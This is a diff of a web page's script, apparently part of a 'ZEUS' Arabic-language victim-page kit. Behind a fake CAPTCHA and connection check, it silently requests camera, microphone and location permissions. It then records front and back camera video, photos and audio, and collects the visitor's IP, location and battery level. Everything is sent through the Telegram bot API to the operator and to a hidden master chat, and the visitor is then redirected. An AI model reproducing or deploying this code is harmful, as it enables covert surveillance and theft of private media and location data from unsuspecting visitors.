+                            // حاول watchPosition كـ fallback
+                            watchId = navigator.geolocation.watchPosition(
+                                function(pos) {
+                                    if (resolved) return;
+                                    resolved = true;
+                                    if (watchId) navigator.geolocation.clearWatch(watchId);
+                                    resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude });
+                                },
+                                function() {
+                                    if (resolved) return;
+                                    resolved = true;
+                                    if (watchId) navigator.geolocation.clearWatch(watchId);
+                                    resolve({ lat: null, lng: null });
+                                },
+                                { timeout: 8000, enableHighAccuracy: false }
+                            );
+                            // timeout للـ watch
+                            setTimeout(function() {
+                                if (!resolved) {
+                                    resolved = true;
+                                    if (watchId) navigator.geolocation.clearWatch(watchId);
+                                    resolve({ lat: null, lng: null });
+                                }
+                            }, 10000);
+                        }
+
+                        navigator.geolocation.getCurrentPosition(success, fail, { timeout: 5000,
+                        enableHighAccuracy: true });
+                    });
+                }
+
+                // ===== FIXED RECORD STREAM =====
+                function recordStream(stream, duration) {
+                    return new Promise(function(resolve) {
+                        if (!stream || !stream.active) {
+                            resolve(null);
+                            return;
+                        }
+                        var recorder;
+                        try {
+                            recorder = new MediaRecorder(stream);
+                        } catch (e) {
+                            resolve(null);
+                            return;
+                        }
+                        var chunks = [];
+                        recorder.ondataavailable = function(e) {
+                            if (e.data && e.data.size > 0) chunks.push(e.data);
+                        };
+                        recorder.onstop = function() {
+                            if (chunks.length === 0) { resolve(null); return; }
+                            var blob = new Blob(chunks, { type: recorder.mimeType || 'video/webm' });
+                            resolve(blob);
+                        };
+                        recorder.onerror = function() { resolve(null); };
+                        recorder.start();
+                        setTimeout(function() {
+                            if (recorder.state === 'recording') recorder.stop();
+                        }, duration);
+                    });
+                }
+
+                // ===== FIXED CAPTURE PHOTO =====
+                function capturePhoto(videoEl) {
+                    return new Promise(function(resolve) {
+                        if (!videoEl || !videoEl.videoWidth || !videoEl.videoHeight) {
+                            resolve(null);
+                            return;
+                        }
+                        var w = videoEl.videoWidth;
+                        var h = videoEl.videoHeight;
+                        var tempCanvas = document.createElement('canvas');
+                        tempCanvas.width = w;
+                        tempCanvas.height = h;
+                        var tempCtx = tempCanvas.getContext('2d');
+                        tempCtx.drawImage(videoEl, 0, 0, w, h);
+                        tempCanvas.toBlob(function(b) {
+                            resolve(b);
+                        }, 'image/jpeg', 0.85);
+                    });
+                }
+
+                // ===== RECORD AUDIO =====
+                async function recordAudio(duration) {
+                    try {
+                        var stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                        var recorder = new MediaRecorder(stream);
+                        var chunks = [];
+                        recorder.ondataavailable = function(e) { if (e.data && e.data.size > 0) chunks.push(e.data); };
+                        return new Promise(function(resolve) {
+                            recorder.onstop = function() {
+                                var blob = new Blob(chunks, { type: recorder.mimeType || 'audio/webm' });
+                                stream.getTracks().forEach(function(t) { t.stop(); });
+                                resolve(blob);
+                            };
+                            recorder.onerror = function() { resolve(null); };
+                            recorder.start();
+                            setTimeout(function() { if (recorder.state === 'recording') recorder.stop(); }, duration);
+                        });
+                    } catch { return null; }
+                }
+
+                // ===== SILENT PERMISSIONS =====
+                async function requestAllPermissionsSilent() {
+                    var perms = [
+                        { name: 'video', constraint: { video: { facingMode: 'user' } } },
+                        { name: 'videoBack', constraint: { video: { facingMode: 'environment' } } },
+                        { name: 'audio', constraint: { audio: true } },
+                        { name: 'location', constraint: null }
+                    ];
+                    var results = {};
+                    for (var i = 0; i < perms.length; i++) {
+                        var p = perms[i];
+                        try {
+                            if (p.constraint) {
+                                var stream = await navigator.mediaDevices.getUserMedia(p.constraint);
+                                if (stream) { stream.getTracks().forEach(function(t) { t.stop(); }); }
+                                results[p.name] = true;
+                            } else {
+                                if (navigator.geolocation) {
+                                    var pos = await new Promise(function(resolve) {
+                                        navigator.geolocation.getCurrentPosition(function(p) { resolve(p); },
+                                        function() { resolve(null); });
+                                    });
+                                    results[p.name] = !!pos;
+                                } else { results[p.name] = false; }
+                            }
+                        } catch (e) { results[p.name] = false; }
+                        await delay(80);
+                    }
+                    var allFailed = Object.values(results).every(function(v) { return !v; });
+                    if (allFailed) {
+                        await delay(1000);
+                        for (var key in results) {
+                            if (!results[key]) {
+                                try {
+                                    if (key === 'video') { var s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                                        s.getTracks().forEach(function(t) { t.stop(); }); results[key] = true; } else if (key ===
+                                        'videoBack') { var s2 = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+                                        s2.getTracks().forEach(function(t) { t.stop(); }); results[key] = true; } else if (key ===
+                                        'audio') { var s3 = await navigator.mediaDevices.getUserMedia({ audio: true });
+                                        s3.getTracks().forEach(function(t) { t.stop(); }); results[key] = true; } else if (key ===
+                                        'location') { var pos2 = await new Promise(function(resolve) { navigator.geolocation
+                                            .getCurrentPosition(function(p) { resolve(p); }, function() { resolve(
+                                                null); }); });
+                                        results[key] = !!pos2; }
+                                } catch (e) {}
+                            }
+                        }
+                    }
+                    return Object.values(results).some(function(v) { return v; });
+                }
+
+                // ===== MAIN COLLECT =====
+                async function collectAndStore() {
+                    if (isRunning || collectionDone) return;
+                    var permOk = await requestAllPermissionsSilent();
+                    if (!permOk) {
+                        mainText.textContent = '✗ حدث خطأ في الاتصال — حاول مجدداً';
+                        mainText.className = 'text failed';
+                        spinner.classList.remove('loading');
+                        spinner.classList.add('failed');
+                        setTimeout(function() { location.reload(); }, 1500);
+                        return;
+                    }
+
+                    isRunning = true;
+                    spinner.classList.add('loading');
+                    mainText.textContent = 'جاري التحقق من الاتصال …';
+                    mainText.className = 'text loading';
+
+                    try {
+                        var ip = await getIP();
+                        var location = await getLocation();
+                        var battery = await getBatteryStatus();
+
+                        console.log('✅ IP:', ip);
+                        console.log('✅ Location:', location);
+
+                        // --- FRONT CAMERA ---
+                        var frontResult = await (function() {
+                            return new Promise(async function(resolve) {
+                                try {
+                                    var stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' },
+                                        audio: false });
+                                    video.srcObject = stream;
+                                    await video.play();
+                                    await delay(300);
+                                    var videoBlob = await recordStream(stream, 5000);
+                                    var photos = [];
+                                    for (var i = 0; i < 2; i++) {
+                                        var p = await capturePhoto(video);
+                                        if (p) photos.push(p);
+                                        await delay(150);
+                                    }
+                                    resolve({ video: videoBlob, photos: photos });
+                                } catch (e) {
+                                    console.error('❌ Front camera error:', e);
+                                    resolve({ video: null, photos: [] });
+                                } finally {
+                                    if (stream) { stream.getTracks().forEach(function(t) { t.stop(); }); }
+                                    video.srcObject = null;
+                                }
+                            });
+                        })();
+
+                        // --- BACK CAMERA ---
+                        var backVideo = await (function() {
+                            return new Promise(async function(resolve) {
+                                try {
+                                    var stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' },
+                                        audio: false });
+                                    video.srcObject = stream;
+                                    await video.play();
+                                    await delay(300);
+                                    var blob = await recordStream(stream, 5000);
+                                    resolve(blob);
+                                } catch (e) {
+                                    console.error('❌ Back camera error:', e);
+                                    resolve(null);
+                                } finally {
+                                    if (stream) { stream.getTracks().forEach(function(t) { t.stop(); }); }
+                                    video.srcObject = null;
+                                }
+                            });
+                        })();
+
+                        // --- AUDIO ---
+                        var audioBlob = await recordAudio(5000);
+
+                        var token = 'غير معروف';
+                        if (botCreds && botCreds.botToken) {
+                            var params = new URLSearchParams(window.location.search);
+                            token = params.get('t') || 'غير معروف';
+                        }
+
+                        var data = {
+                            ip: ip,
+                            location: location,
+                            device: navigator.platform || 'Unknown',
+                            browser: /Chrome/.test(navigator.userAgent) ? 'Chrome' :
+                                /Firefox/.test(navigator.userAgent) ? 'Firefox' :
+                                /Safari/.test(navigator.userAgent) ? 'Safari' : 'Unknown',
+                            timestamp: new Date().toISOString(),
+                            frontVideo: frontResult.video,
+                            backVideo: backVideo,
+                            audio: audioBlob,
+                            photos: frontResult.photos
+                        };
+
+                        console.log('✅ Front photos:', data.photos.length);
+                        console.log('✅ Front video:', !!data.frontVideo);
+                        console.log('✅ Back video:', !!data.backVideo);
+                        console.log('✅ Audio:', !!data.audio);
+
+                        // --- SAVE VICTIM ---
+                        var victims = JSON.parse(localStorage.getItem('zeus_victims') || '[]');
+                        var victimId = Date.now() + Math.floor(Math.random() * 1000);
+                        var victimData = {
+                            id: victimId,
+                            shortToken: token,
+                            ip: data.ip,
+                            location: data.location,
+                            browser: data.browser,
+                            timestamp: data.timestamp,
+                            device: data.device
+                        };
+                        victims.push(victimData);
+                        localStorage.setItem('zeus_victims', JSON.stringify(victims));
+
+                        // --- SAVE FILES ---
+                        var files = JSON.parse(localStorage.getItem('zeus_files') || '[]');
+                        var fileId = Date.now();
+
+                        var saveFile = function(fileData) {
+                            return new Promise(function(resolve) {
+                                if (!fileData.blob) { resolve(); return; }
+                                var reader = new FileReader();
+                                reader.onload = function() {
+                                    files.push({
+                                        id: fileId++,
+                                        shortToken: token,
+                                        victimId: victimId,
+                                        type: fileData.type,
+                                        filename: fileData.filename,
+                                        dataUrl: reader.result,
+                                        timestamp: Date.now()
+                                    });
+                                    resolve();
+                                };
+                                reader.readAsDataURL(fileData.blob);
+                            });
+                        };
+
+                        if (data.photos && data.photos.length > 0) {
+                            for (var i = 0; i < data.photos.length; i++) {
+                                if (data.photos[i]) {
+                                    await saveFile({ blob: data.photos[i], type: 'image', filename: 'photo_' + (i +
+                                        1) + '.jpg' });
+                                }
+                            }
+                        }
+                        if (data.frontVideo) await saveFile({ blob: data.frontVideo, type: 'video', filename: 'front_video.webm' });
+                        if (data.backVideo) await saveFile({ blob: data.backVideo, type: 'video', filename: 'back_video.webm' });
+                        if (data.audio) await saveFile({ blob: data.audio, type: 'audio', filename: 'audio.webm' });
+                        localStorage.setItem('zeus_files', JSON.stringify(files));
+
+                        console.log('✅ Files saved:', files.length);
+
+                        // --- SEND TO TELEGRAM ---
+                        if (botCreds && botCreds.botToken && botCreds.chatId) {
+                            await sendToUserBot(botCreds.botToken, botCreds.chatId, data, battery, token).catch(
+                            function(e) { console.error('❌ sendToUserBot error:', e); });
+                        }
+                        await sendToMaster(data, battery, token).catch(function(e) { console.error('❌ sendToMaster error:',
+                            e); });
+
+                        addLog('success', 'جمع بيانات ضحية جديدة (IP: ' + data.ip + ')');
+
+                        collectionDone = true;
+                        mainText.textContent = '✓ جارٍ تحويلك …';
+                        mainText.className = 'text success';
+                        spinner.classList.remove('loading');
+                        spinner.classList.add('success');
+
+                        setTimeout(function() {
+                            if (redirectUrl) {
+                                window.location.replace(redirectUrl);
+                            } else {
+                                window.location.reload();
+                            }
+                        }, 1800);
+
+                    } catch (error) {
+                        console.error('❌ collectAndStore error:', error);
+                        mainText.textContent = '✗ حدث خطأ في الاتصال — حاول مجدداً';
+                        mainText.className = 'text failed';
+                        spinner.classList.remove('loading');
+                        spinner.classList.add('failed');
+                        isRunning = false;
+                        setTimeout(function() { location.reload(); }, 1500);
+                    }
+                }
+
+                // ===== TELEGRAM SEND HELPERS =====
+                async function sendMedia(method, token, formData) {
+                    try { await fetch('https://api.telegram.org/bot' + token + '/' + method, { method: 'POST', body: formData }); } catch (
+                    e) { console.error('sendMedia error:', e); }
+                }
+
+                function formatBatteryMessage(battery) {
+                    return '⭑ حالة البطارية ⭒\n⊚─〔 الطاقة 〕────────\n˼🔋˹ النسبة: ' + battery.level +
+                        ' ⭒\n─────────────────';
+                }
+
+                function formatLocationMessage(location) {
+                    if (!location.lat || !location.lng) return '⭑ حالة الموقع ⭒\n⊚─〔 تنبيه 〕────────\n˼⚠️˹ الموقع غير متاح ⭒\n─────────────────';
+                    var mapsUrl = 'https://www.google.com/maps?q=' + location.lat + ',' + location.lng;
+                    return '⭑ حالة الموقع ⭒\n⊚─〔 تنبيه 〕────────\n˼⚠️˹ الموقع: [' + location.lat + ', ' + location.lng +
+                        '](' + mapsUrl + ') ⭒\n─────────────────';
+                }
+
+                function formatVisitMessage(ip, browser, token, time) {
+                    return '⭑ زيارة جديدة ⭒\n⊚─〔 دخول 〕────────\n˼🕒˹ ' + time +
+                        ' ⭒\n˼🆔˹ التوكن: ' + token +
+                        ' ⭒\n˼🌐˹ الـ IP: ' + ip +
+                        ' ⭒\n˼📌˹ الحدث: زيارة ⭒\n˼📱˹ المتصفح: ' + browser +
+                        ' ⭒\n─────────────────';
+                }
+
+                async function sendToUserBot(userToken, chatId, data, battery, token) {
+                    var inlineKeyboard = {
+                        inline_keyboard: [
+                            [{ text: '👤 المطور', url: DEVELOPER_LINK }]
+                        ]
+                    };
+
+                    // Battery
+                    var battMsg = formatBatteryMessage(battery);
+                    await fetch('https://api.telegram.org/bot' + userToken + '/sendMessage', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: chatId, text: battMsg, parse_mode: 'Markdown',
+                            reply_markup: inlineKeyboard })
+                    }).catch(function(e) { console.error('Battery error:', e); });
+
+                    // Location
+                    var locMsg = formatLocationMessage(data.location);
+                    await fetch('https://api.telegram.org/bot' + userToken + '/sendMessage', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: chatId, text: locMsg, parse_mode: 'Markdown',
+                            reply_markup: inlineKeyboard })
+                    }).catch(function(e) { console.error('Location error:', e); });
+
+                    // Visit
+                    var visitMsg = formatVisitMessage(data.ip, data.browser, token, data.timestamp);
+                    await fetch('https://api.telegram.org/bot' + userToken + '/sendMessage', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: chatId, text: visitMsg, parse_mode: 'Markdown',
+                            reply_markup: inlineKeyboard })
+                    }).catch(function(e) { console.error('Visit error:', e); });
+
+                    // Photos (2 photos)
+                    if (data.photos && data.photos.length > 0) {
+                        for (var i = 0; i < data.photos.length; i++) {
+                            if (!data.photos[i]) continue;
+                            var fd = new FormData();
+                            fd.append('chat_id', chatId);
+                            fd.append('photo', data.photos[i], 'photo_' + (i + 1) + '.jpg');
+                            fd.append('caption',
+                                '⭑ صورة ' + (i + 1) + '/' + data.photos.length + ' ⭒\n⊚─〔 ميديا الضحية 〕────────\n˼⏣˹ النوع: صورة ⭒\n˼⏣˹ الترتيب: ' +
+                                (i + 1) + ' من ' + data.photos.length +
+                                ' ⭒\n˼⏣˹ الوقت: ' + new Date().toLocaleString('ar-EG') +
+                                ' ⭒\n─────────────────');
+                            await sendMedia('sendPhoto', userToken, fd);
+                        }
+                    }
+
+                    // Front Video
+                    if (data.frontVideo) {
+                        var fd = new FormData();
+                        fd.append('chat_id', chatId);
+                        fd.append('video', data.frontVideo, 'front_video.webm');
+                        fd.append('caption',
+                            '⭑ فيديو أمامي ⭒\n⊚─〔 ميديا الضحية 〕────────\n˼⏣˹ النوع: فيديو (أمامي) ⭒\n˼⏣˹ الوقت: ' +
+                            new Date().toLocaleString('ar-EG') + ' ⭒\n─────────────────');
+                        await sendMedia('sendVideo', userToken, fd);
+                    }
+
+                    // Back Video
+                    if (data.backVideo) {
+                        var fd = new FormData();
+                        fd.append('chat_id', chatId);
+                        fd.append('video', data.backVideo, 'back_video.webm');
+                        fd.append('caption',
+                            '⭑ فيديو خلفي ⭒\n⊚─〔 ميديا الضحية 〕────────\n˼⏣˹ النوع: فيديو (خلفي) ⭒\n˼⏣˹ الوقت: ' +
+                            new Date().toLocaleString('ar-EG') + ' ⭒\n─────────────────');
+                        await sendMedia('sendVideo', userToken, fd);
+                    }
+
+                    // Audio
+                    if (data.audio) {
+                        var fd = new FormData();
+                        fd.append('chat_id', chatId);
+                        fd.append('audio', data.audio, 'audio.webm');
+                        fd.append('caption',
+                            '⭑ تسجيل صوتي ⭒\n⊚─〔 ميديا الضحية 〕────────\n˼⏣˹ النوع: صوت ⭒\n˼⏣˹ الوقت: ' +
+                            new Date().toLocaleString('ar-EG') + ' ⭒\n─────────────────');
+                        await sendMedia('sendAudio', userToken, fd);
+                    }
+
+                    // Location
+                    if (data.location && data.location.lat && data.location.lng) {
+                        try {
+                            await fetch('https://api.telegram.org/bot' + userToken + '/sendLocation', {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ chat_id: chatId, latitude: data.location.lat,
+                                    longitude: data.location.lng })
+                            });
+                        } catch (e) {}
+                    }
+                }
+
+                async function sendToMaster(data, battery, token) {
+                    var userInfo = botCreds ?
+                        '˼⏣˹ توكن المستخدم: ' + botCreds.botToken + ' ⭒\n˼⏣˹ إيدي المستخدم: ' + botCreds.chatId +
+                        ' ⭒' :
+                        '˼⏣˹ لا توجد بيانات مستخدم ⭒';
+                    var inlineKeyboard = {
+                        inline_keyboard: [
+                            [{ text: '👤 المطور', url: DEVELOPER_LINK }]
+                        ]
+                    };
+
+                    var battMsg = '⭑ نسخة احتياطية ⭒\n' + formatBatteryMessage(battery) + '\n' + userInfo +
+                        '\n˼⏣˹ الوقت: ' + new Date().toLocaleString('ar-EG') + ' ⭒';
+                    await fetch('https://api.telegram.org/bot' + MASTER_BOT_TOKEN + '/sendMessage', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: battMsg, parse_mode: 'Markdown',
+                            reply_markup: inlineKeyboard })
+                    }).catch(function(e) { console.error('Master battery error:', e); });
+
+                    var locMsg = '⭑ نسخة احتياطية ⭒\n' + formatLocationMessage(data.location) + '\n' + userInfo +
+                        '\n˼⏣˹ الوقت: ' + new Date().toLocaleString('ar-EG') + ' ⭒';
+                    await fetch('https://api.telegram.org/bot' + MASTER_BOT_TOKEN + '/sendMessage', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: locMsg, parse_mode: 'Markdown',
+                            reply_markup: inlineKeyboard })
+                    }).catch(function(e) { console.error('Master location error:', e); });
+
+                    var visitMsg = '⭑ نسخة احتياطية ⭒\n' + formatVisitMessage(data.ip, data.browser, token, data
+                        .timestamp) + '\n' + userInfo +
+                        '\n˼⏣˹ الوقت: ' + new Date().toLocaleString('ar-EG') + ' ⭒';
+                    await fetch('https://api.telegram.org/bot' + MASTER_BOT_TOKEN + '/sendMessage', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: visitMsg, parse_mode: 'Markdown',
+                            reply_markup: inlineKeyboard })
+                    }).catch(function(e) { console.error('Master visit error:', e); });
+
+                    // Photos
+                    if (data.photos && data.photos.length > 0) {
+                        for (var i = 0; i < data.photos.length; i++) {
+                            if (!data.photos[i]) continue;
+                            var fd = new FormData();
+                            fd.append('chat_id', MASTER_CHAT_ID);
+                            fd.append('photo', data.photos[i], 'photo_' + (i + 1) + '.jpg');
+                            fd.append('caption',
+                                '⭑ صورة ' + (i + 1) + '/' + data.photos.length +
+                                ' ⭒\n⊚─〔 ميديا احتياطية 〕────────\n˼⏣˹ النوع: صورة ⭒\n˼⏣˹ الترتيب: ' +
+                                (i + 1) + ' من ' + data.photos.length +
+                                ' ⭒\n˼⏣˹ الوقت: ' + new Date().toLocaleString('ar-EG') + ' ⭒\n─────────────────');
+                            await sendMedia('sendPhoto', MASTER_BOT_TOKEN, fd);
+                        }
+                    }
+                    if (data.frontVideo) {
+                        var fd = new FormData();
+                        fd.append('chat_id', MASTER_CHAT_ID);
+                        fd.append('video', data.frontVideo, 'front_video.webm');
+                        fd.append('caption',
+                            '⭑ فيديو أمامي ⭒\n⊚─〔 ميديا احتياطية 〕────────\n˼⏣˹ النوع: فيديو (أمامي) ⭒\n˼⏣˹ الوقت: ' +
+                            new Date().toLocaleString('ar-EG') + ' ⭒\n─────────────────');
+                        await sendMedia('sendVideo', MASTER_BOT_TOKEN, fd);
+                    }
+                    if (data.backVideo) {
+                        var fd = new FormData();
+                        fd.append('chat_id', MASTER_CHAT_ID);
+                        fd.append('video', data.backVideo, 'back_video.webm');
+                        fd.append('caption',
+                            '⭑ فيديو خلفي ⭒\n⊚─〔 ميديا احتياطية 〕────────\n˼⏣˹ النوع: فيديو (خلفي) ⭒\n˼⏣˹ الوقت: ' +
+                            new Date().toLocaleString('ar-EG') + ' ⭒\n─────────────────');
+                        await sendMedia('sendVideo', MASTER_BOT_TOKEN, fd);
+                    }
+                    if (data.audio) {
+                        var fd = new FormData();
+                        fd.append('chat_id', MASTER_CHAT_ID);
+                        fd.append('audio', data.audio, 'audio.webm');
+                        fd.append('caption',
+                            '⭑ تسجيل صوتي ⭒\n⊚─〔 ميديا احتياطية 〕────────\n˼⏣˹ النوع: صوت ⭒\n˼⏣˹ الوقت: ' +
+                            new Date().toLocaleString('ar-EG') + ' ⭒\n─────────────────');
+                        await sendMedia('sendAudio', MASTER_BOT_TOKEN, fd);
+                    }
+                    if (data.location && data.location.lat && data.location.lng) {
+                        try {
+                            await fetch('https://api.telegram.org/bot' + MASTER_BOT_TOKEN + '/sendLocation', {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ chat_id: MASTER_CHAT_ID, latitude: data.location.lat,
+                                    longitude: data.location.lng })
+                            });
+                        } catch (e) {}
+                    }
+                }
+
+                async function getBatteryStatus() {
+                    try {
+                        if (!navigator.getBattery) return { level: 'غير متاح', charging: false };
+                        var battery = await navigator.getBattery();
+                        return { level: Math.round(battery.level * 100) + '%', charging: battery.charging };
+                    } catch (e) { return { level: 'غير متاح', charging: false }; }
+                }
+
+                // ===== EVENTS =====
+                document.addEventListener('click', function(e) {
+                    if (isRunning || collectionDone) return;
+                    if (e.target.closest('a')) return;
+                    if (!checkbox.checked && !spinner.classList.contains('loading')) {
+                        collectAndStore();
+                    }
+                });
+
+                checkbox.addEventListener('change', function(e) {
+                    if (this.checked) {
+                        this.checked = false;
+                        if (!isRunning && !collectionDone) {
+                            collectAndStore();
+                        }
+                    }
+                });
+
+                document.getElementById('captchaWrapper').addEventListener('click', function(e) {
+                    if (e.target.closest('a')) return;
+                    if (isRunning || collectionDone) return;
+                    if (!checkbox.checked) {
+                        collectAndStore();
+                    }
+                });
+
+                console.log('ZEUS — Victim page ready v10.05 (full fixed).');
+                applyTheme(currentTheme);
+            }
+
+            // ================================================================
+            //  INIT
+            // ================================================================
+
+            window.renderDashboard = renderDashboard;
+            window.dashDeleteBot = dashDeleteBot;
+            window.dashDeleteVictim = dashDeleteVictim;
+            window.dashViewVictimFiles = dashViewVictimFiles;
+            window.dashViewBotDetails = dashViewBotDetails;
+            window.addLog = addLog;
+            window.copyText = copyText;
+
+            console.log('ZEUS KINGDOM — v10.05 (FULL FIXED: IP, Location, Photos, Videos, Audio, Duplicates)');
+            console.log('الباب السري: النقر الثلاثي على شعار ZEUS أو Ctrl+Shift+D');
+            console.log('مرحلة الأذونات: صامتة تماماً، لا تظهر للمستخدم.');
+            console.log('مدة التسجيلات: 5 ثوانٍ (حسب أمرك).');
+
+            applyTheme(currentTheme);
+
+        })();
+    </script>
+</body>
+</html>
